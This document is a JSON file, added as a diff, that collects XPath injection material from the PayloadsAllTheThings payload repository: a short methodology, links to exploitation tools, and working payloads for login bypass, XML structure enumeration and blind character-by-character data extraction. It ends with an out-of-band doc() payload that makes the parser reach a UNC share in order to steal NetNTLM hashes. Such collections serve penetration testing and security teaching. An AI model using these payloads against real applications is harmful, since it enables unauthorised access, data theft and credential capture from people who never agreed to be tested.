@@ -1,0 +1,76 @@
+{
+  "category": "XPATH Injection",
+  "source": "PayloadsAllTheThings/XPATH Injection/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What is XPath injection and where to look",
+      "language": "text",
+      "tags": ["methodology", "xpath", "recon"],
+      "body": "XPath injection occurs when user input is substituted into an XPath query (the language for navigating XML) without escaping. The attacker breaks the query syntax with their own quotes and operators, changing the selection logic over the XML document.\n\nWhere to look:\n• Login forms where accounts are stored in XML rather than in a DB - a typical target for authentication bypass.\n• Search/filters that turn into a query against XML (catalogs, configs, price lists).\n• Any input that lands in an expression of the form //user[name/text()='INPUT'].\n\nExploitation idea: as in SQL injection, you need to correctly \"close\" the query with your own quote, then append an always-true condition (authentication bypass) or extract data character by character via substring (blind)."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Context of the vulnerable query (how XPath is formed)",
+      "language": "text",
+      "tags": ["methodology", "xpath", "context"],
+      "body": "Example of unsafe XPath concatenation from user input (vuln_var1):\n\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())\n\nThe input is substituted directly inside the quotes name/text()='...' - therefore the payload starts with ' to close the string and continue the expression."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Tools for exploiting XPath injection",
+      "language": "text",
+      "tags": ["tools", "automation"],
+      "body": "• orf/xcat - automation of XPath injections for extracting documents: https://github.com/orf/xcat\n• feakk/xxxpwn - an advanced XPath injection tool: https://github.com/feakk/xxxpwn\n• aayla-secura/xxxpwn_smart - a fork of xxxpwn with predictive input: https://github.com/aayla-secura/xxxpwn_smart\n• micsoftvn/xpath-blind-explorer: https://github.com/micsoftvn/xpath-blind-explorer\n• Harshal35/XmlChor - an XPath injection exploitation tool: https://github.com/Harshal35/XMLCHOR"
+    },
+    {
+      "subcategory": "Authentication bypass",
+      "title": "Tautologies for login bypass (always-true)",
+      "language": "text",
+      "tags": ["auth-bypass", "tautology"],
+      "body": "' or '1'='1\n' or ''='\nx' or 1=1 or 'x'='y"
+    },
+    {
+      "subcategory": "Structure extraction",
+      "title": "Node selectors for traversing the XML tree",
+      "language": "text",
+      "tags": ["structure", "enumeration", "nodes"],
+      "body": "/\n//\n//*\n*/*\n@*\ncount(/child::node())"
+    },
+    {
+      "subcategory": "Structure extraction",
+      "title": "Checking a node name and counting elements",
+      "language": "text",
+      "tags": ["structure", "enumeration", "count"],
+      "body": "x' or name()='username' or 'x'='y\n' and count(/*)=1 and '1'='1\n' and count(/@*)=1 and '1'='1\n' and count(/comment())=1 and '1'='1"
+    },
+    {
+      "subcategory": "Structure extraction",
+      "title": "Extracting neighboring nodes and checking password",
+      "language": "text",
+      "tags": ["structure", "extraction", "password"],
+      "body": "')] | //user/*[contains(*,'\n') and contains(../password,'c\n') and starts-with(../password,'c"
+    },
+    {
+      "subcategory": "Blind exploitation",
+      "title": "String length (string-length)",
+      "language": "text",
+      "tags": ["blind", "boolean-based", "string-length"],
+      "body": "Guess SIZE_INT until the condition becomes true - this is how you find out the length of the value:\n\nand string-length(account)=SIZE_INT"
+    },
+    {
+      "subcategory": "Blind exploitation",
+      "title": "Character-by-character extraction (substring)",
+      "language": "text",
+      "tags": ["blind", "boolean-based", "substring"],
+      "body": "Access a character by position via substring; the value is checked directly or via codepoints-to-string (by the character's ORD code):\n\nsubstring(//user[userid=5]/username,2,1)=CHAR_HERE\nsubstring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)"
+    },
+    {
+      "subcategory": "Out-of-Band exfiltration",
+      "title": "Leak via doc() (UNC / SMB)",
+      "language": "text",
+      "tags": ["oob", "exfiltration", "doc"],
+      "body": "The doc() function forces the parser to reach an external resource - suitable for OOB confirmation and stealing a NetNTLM hash via a UNC path:\n\nhttp://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')"
+    }
+  ]
+}
